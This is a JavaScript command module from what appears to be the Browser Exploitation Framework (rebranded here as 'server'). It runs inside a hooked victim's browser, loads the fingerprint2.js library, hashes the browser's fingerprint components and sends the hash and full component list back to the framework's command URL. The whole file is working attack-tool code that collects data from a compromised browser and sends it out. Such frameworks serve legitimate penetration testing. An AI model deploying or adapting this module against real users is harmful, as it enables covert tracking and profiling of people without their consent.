//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  <%=
    begin
      f = "#{$root_dir}/modules/browser/fingerprint_browser/fingerprint2.js"
      File.read(f)
    rescue => e
      print_error "[Fingerprint Browser] Could not read file '#{f}': #{e.message}"
    end
  %>

  try {
    setTimeout(function () {
      Fingerprint2.get(function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
        server.debug('[Fingerprint Browser] Fingerprint: ' + murmur);
        server.debug('[Fingerprint Browser] Components: ' + JSON.stringify(components));
        server.net.send("<%= @command_url %>", <%= @command_id %>, 'fingerprint=' + murmur + '&components=' + JSON.stringify(components), server.are.status_success());
      })
    }, 500)
  } catch(e) {
    server.debug('[Fingerprint Browser] Error: ' + e.message);
    server.net.send("<%= @command_url %>", <%= @command_id %>, 'fail=' + e.message, server.are.status_error());
  }
});

